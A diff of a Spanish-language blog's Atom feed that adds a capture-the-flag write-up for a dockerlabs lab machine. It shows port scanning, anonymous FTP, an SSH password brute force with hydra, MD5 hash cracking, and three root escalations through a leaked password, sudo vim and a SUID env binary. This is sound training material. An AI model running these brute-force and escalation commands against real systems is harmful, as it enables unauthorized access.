@@ -1,4 +1,273 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-25T23:33:14+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">ChocolateFire</title><link href="/posts/chocolatefire/" rel="alternate" type="text/html" title="ChocolateFire" /><published>2024-06-25T00:00:00+00:00</published><updated>2024-06-25T00:00:00+00:00</updated><id>/posts/chocolatefire</id><content type="html" xml:base="/posts/chocolatefire/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-26T11:18:55+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Obsession</title><link href="/posts/obsession/" rel="alternate" type="text/html" title="Obsession" /><published>2024-06-26T00:00:00+00:00</published><updated>2024-06-26T00:00:00+00:00</updated><id>/posts/obsession</id><content type="html" xml:base="/posts/obsession/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel muy facil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Vemos que tiene los puertos 21, 22 y 80 abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| <span class="nt">-rw-r--r--</span>    1 0        0             667 Jun 18 03:20 chat-gonza.txt
+|_-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Russoski Coaching
+MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Como vemos se puede acceder al ftp de forma anónima con las credenciales de <code class="language-plaintext highlighter-rouge">ftp:ftp</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp ftp@172.17.0.2
+Connected to 172.17.0.2.
+220 <span class="o">(</span>vsFTPd 3.0.5<span class="o">)</span>
+331 Please specify the password.
+Password: 
+230 Login successful.
+</code></pre></div></div>
+
+<p>Nos descargamos todos los ficheros con <code class="language-plaintext highlighter-rouge">mget *</code> y respondemos <code class="language-plaintext highlighter-rouge">a</code> para que se descargue todos sin volver a preguntar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; mget <span class="k">*</span>
+mget chat-gonza.txt <span class="o">[</span>anpqy?]? a
+Prompting off <span class="k">for </span>duration of mget.
+229 Entering Extended Passive Mode <span class="o">(||</span>|17408|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>chat-gonza.txt <span class="o">(</span>667 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************</span>|   667       13.82 MiB/s    00:00 ETA
+226 Transfer complete.
+667 bytes received <span class="k">in </span>00:00 <span class="o">(</span>673.59 KiB/s<span class="o">)</span>
+229 Entering Extended Passive Mode <span class="o">(||</span>|32406|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>pendientes.txt <span class="o">(</span>315 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************</span>|   315        5.36 MiB/s    00:00 ETA
+226 Transfer complete.
+315 bytes received <span class="k">in </span>00:00 <span class="o">(</span>466.08 KiB/s<span class="o">)</span>
+ftp&gt;
+</code></pre></div></div>
+
+<p>Leemos el fichero <code class="language-plaintext highlighter-rouge">chat-gonza.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>chat-gonza.txt 
+<span class="o">[</span>16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
+<span class="o">[</span>16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
+<span class="o">[</span>16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
+<span class="o">[</span>21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
+<span class="o">[</span>21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
+<span class="o">[</span>22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
+</code></pre></div></div>
+
+<p>Como hace mención a una URL realizamos una búsqueda de directorios y ficheros en el servidor. Para ello, usamos la herramienta <code class="language-plaintext highlighter-rouge">feroxbuster</code>. Como parámetros le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda y con <code class="language-plaintext highlighter-rouge">-r</code> que si hay alguna redireccion que la siga.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-r</span>
+200      GET      158l      358w     3292c http://172.17.0.2/style.css
+200      GET       16l       51w      731c http://172.17.0.2/.formrellyrespexit.html
+200      GET      118l      384w     5208c http://172.17.0.2/
+200      GET        1l        8w       61c http://172.17.0.2/backup/backup.txt
+200      GET       16l       60w      937c http://172.17.0.2/backup/
+200      GET       37l      287w     2417c http://172.17.0.2/important/important.md
+200      GET       16l       58w      947c http://172.17.0.2/important/
+</code></pre></div></div>
+
+<p>Encontramos varios ficheros entre ellos <code class="language-plaintext highlighter-rouge">/backup/backup.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/backup/backup.txt        
+Usuario para todos mis servicios: russoski <span class="o">(</span>cambiar pronto!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Con esto ya tenemos un usuario del sistema <strong>russoski</strong>.</p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vamos a probar si el usuario <strong>russoski</strong> tiene una password que este en el famoso diccionario <em>rockyou.txt</em>. Usaremos la herramienta hydra para realizar un ataque de fuerza bruta al servicio <code class="language-plaintext highlighter-rouge">ssh</code>. Le indicamos con <code class="language-plaintext highlighter-rouge">-l</code> el nombre de usuario, con la<code class="language-plaintext highlighter-rouge">-P</code> el diccionario <em>rockyou.txt</em> con las psswords, con los parámetros <code class="language-plaintext highlighter-rouge">-V -I -f</code> le indicamos que nos muestre por pantalla el detalle de la prueba, que empiece de 0 aunque encuentre un fichero de restauración y que si encuentra una password que se detenga.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> russoski <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-f</span> ssh://172.17.0.2
+...
+<span class="o">[</span>22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+</code></pre></div></div>
+
+<p>Encontramos un password válida para <strong>russoski</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh russoski@172.17.0.2
+russoski@172.17.0.2<span class="s1">'s password:
+russoski@28c41160317a:~$
+</span></code></pre></div></div>
+
+<p>Hacemos un listado completo del home del usuario con <code class="language-plaintext highlighter-rouge">ls -la</code> y vemos que el fichero <code class="language-plaintext highlighter-rouge">.bash_history</code> no está vacio ni esta redirigido a <code class="language-plaintext highlighter-rouge">/dev/null</code>. Lo leemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
+<span class="nb">ls
+pwd
+exit
+ls
+pwd
+exit
+</span>su root
+<span class="nb">sudo</span> <span class="nt">-l</span>
+clear
+su root
+<span class="nb">cd</span> /var/www/html
+<span class="nb">ls
+ls</span> <span class="nt">-la</span>
+<span class="nb">cat</span> .formrellyrespexit.html 
+clear
+<span class="nb">ls
+cd </span>backup/
+<span class="nb">cd</span> ..
+<span class="nb">cd </span>important/
+<span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">cat</span> .root-passwd.txt 
+clear
+<span class="nb">cd</span> /home/russoski/
+<span class="nb">ls
+cd </span>Proyectos/
+<span class="nb">ls
+cd</span> ..
+<span class="nb">cd </span>Documentos/
+<span class="nb">ls
+</span>la <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+clear
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">chmod </span>u+s /usr/bin/env
+<span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
+clear
+<span class="nb">ls
+cd</span> ..
+<span class="nb">ls
+</span>clear
+<span class="nb">ls
+exit
+</span>clear
+<span class="nb">ls
+</span>su root
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/bin/env /bin/sh <span class="nt">-p</span>
+clear
+<span class="nb">cd</span> /root
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+<span class="nb">exit</span>
+
+</code></pre></div></div>
+
+<p>Viendo detalladamente el fichero se aprecian 3 posibles formas que se han usado para escalar privilegios.</p>
+
+<h1 id="escalada-de-privilegios-1">Escalada de privilegios 1</h1>
+
+<p>Nos movemos al directorio <code class="language-plaintext highlighter-rouge">cd /var/www/html/important</code> y leemos el fichero <code class="language-plaintext highlighter-rouge">.root-passwd.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:/var/www/html/important/<span class="nv">$ </span><span class="nb">cat</span> .root-passwd.txt 
+
+Anuar brother, por aquí te dejo la clave de root como dijimos, arréglame eso en cuanto puedas y ya sabes borra este archivo
+apenas ya no lo necesites, que yo lo tengo guardado en KeePassXC, ah y que nadie excepto tú entre a la carpeta <span class="s2">"/root"</span><span class="o">!</span>
+
+aac0a9daa4185875786c9ed154f0dece <span class="o">(</span>te lo he hasheado por si las moscas<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Copiamos el hash y creamos un fichero con el nombre <strong>hash</strong>. Después usando la herramienta <code class="language-plaintext highlighter-rouge">john</code> intentamos desencriptar el hash. Le indicamos que se trata de un hash en <strong>MD5</strong> con <code class="language-plaintext highlighter-rouge">--format=Raw-MD5</code>, el diccionario de passwords con <code class="language-plaintext highlighter-rouge">—-wordlist=</code> y finalmente el fichero que contiene el hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"aac0a9daa4185875786c9ed154f0dece"</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+
+<span class="nv">$ </span>john <span class="nt">--format</span><span class="o">=</span>Raw-MD5  <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+fucker           <span class="o">(</span>?<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Obtenemos una clave y la probamos con <code class="language-plaintext highlighter-rouge">su root</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>su root
+Password:
+root@28c41160317a:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Comprobamos con <code class="language-plaintext highlighter-rouge">id</code> que somos <strong>root</strong></p>
+
+<h1 id="escalada-de-privilegios-2">Escalada de privilegios 2</h1>
+
+<p>La segunda manera es ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver que comandos puede ejecutar como <strong>root</strong> en el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>russoski on 28c41160317a:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User russoski may run the following commands on 28c41160317a:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vim
+</code></pre></div></div>
+
+<p>Como vemos puede ejecutar <code class="language-plaintext highlighter-rouge">vim</code> como <strong>root</strong>. Vamos a la famosa web de <em>GTFOBins</em> y encontramos la manera de escalar privilegios con <em>vim</em> <a href="https://gtfobins.github.io/gtfobins/vim/#sudo">GTFOBins vim</a>. Ejecutamos y comprobamos que somos <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
+
+<span class="c"># whoami</span>
+root
+<span class="c">#</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios-3">Escalada de privilegios 3</h1>
+
+<p>Para finalizar vamos a ver la tercera forma. Esta vez buscamos binarios que tengan el permiso <strong>SUID</strong> activo. Usamos <code class="language-plaintext highlighter-rouge">find</code> y le indicamos que busque desde la raiz <code class="language-plaintext highlighter-rouge">/</code>, ficheros <code class="language-plaintext highlighter-rouge">-type f</code>, que tengan el permiso +s <code class="language-plaintext highlighter-rouge">-perm -4000</code> y que mande los errores a <em>null</em> con <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/env
+/usr/bin/mount
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre></div></div>
+
+<p>Encuentra el binario <strong>env.</strong> Como vemos en <a href="https://gtfobins.github.io/gtfobins/env/#suid">GTFOBins env</a> se puede escalar privilegios de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>/usr/bin/env /bin/sh <span class="nt">-p</span>
+<span class="c"># whoami</span>
+root
+<span class="c">#</span>
+</code></pre></div></div>
+
+<p>Y de esta manera hemos terminado el laboratorio</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="muy facil" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel muy facil y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">ChocolateFire</title><link href="/posts/chocolatefire/" rel="alternate" type="text/html" title="ChocolateFire" /><published>2024-06-25T00:00:00+00:00</published><updated>2024-06-25T00:00:00+00:00</updated><id>/posts/chocolatefire</id><content type="html" xml:base="/posts/chocolatefire/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
 
 <h1 id="enumeración">Enumeración</h1>
 
